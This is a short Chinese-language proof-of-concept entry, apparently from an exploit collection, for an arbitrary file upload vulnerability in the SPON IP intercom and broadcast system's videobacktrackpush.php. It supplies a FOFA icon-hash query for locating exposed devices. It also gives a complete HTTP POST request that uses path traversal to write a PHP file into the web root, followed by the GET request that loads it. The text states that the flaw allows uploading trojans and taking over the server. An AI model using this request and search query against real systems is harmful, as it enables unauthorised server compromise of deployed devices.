## 世邦通信SPON-IP网络对讲广播系统videobacktrackpush.php任意文件上传漏洞

世邦通信 SPON IP网络对讲广播系统 videobacktrackpush.php 存在任意文件上传漏洞，攻击者可以通过漏洞上传任意文件甚至木马文件，从而获取服务器权限。

## fofa

```
icon_hash="-1830859634"
```

## poc

```
POST /php/videobacktrackpush.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Content-Length: 142
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1

jsondata[caller]=1&jsondata[callee]=../../../../../../ICPAS/Wnmp/WWW&jsondata[videoname]=1_2_3.php&jsondata[videocontent]=PD9waHAgZWNobyAxMjM7
```
访问地址
```
GET /1_2_3.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```
